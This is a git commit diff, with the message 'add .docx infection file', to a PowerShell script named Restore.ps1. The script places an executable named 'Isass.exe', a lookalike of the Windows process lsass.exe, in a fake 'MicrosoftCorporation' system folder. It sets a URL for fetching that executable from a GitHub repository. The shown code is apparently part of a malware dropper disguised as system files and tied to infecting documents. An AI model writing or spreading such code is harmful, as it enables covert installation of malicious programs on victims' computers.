a77acbf52eb641f02e92ba7494d7d70cac9c85b7
foxovsky <foxovsky@outlook.com>
2017-05-24 03:14:06 +0300

    add .docx infection file

--- Restore/Restore.ps1
+++ Restore/Restore.ps1
@@ -1,9 +1,9 @@
-$path = "C:\ProgramData\MicrosoftCorporation\Windows\SystemData\"
-$fpath = "C:\ProgramData\MicrosoftCorporation\Windows\SystemData\Isass.exe" 
-$furl = "https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe"
+$path = 'C:\ProgramData\MicrosoftCorporation\Windows\SystemData\'
+$fpath = 'C:\ProgramData\MicrosoftCorporation\Windows\SystemData\Isass.exe'
+$furl = 'https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe'
  
 $isfile = Test-Path $fpath 
-if($isfile -eq "True") {}
+if($isfile -eq 'True') {}
 else
 {
 	New-Item -ItemType directory -Path $path
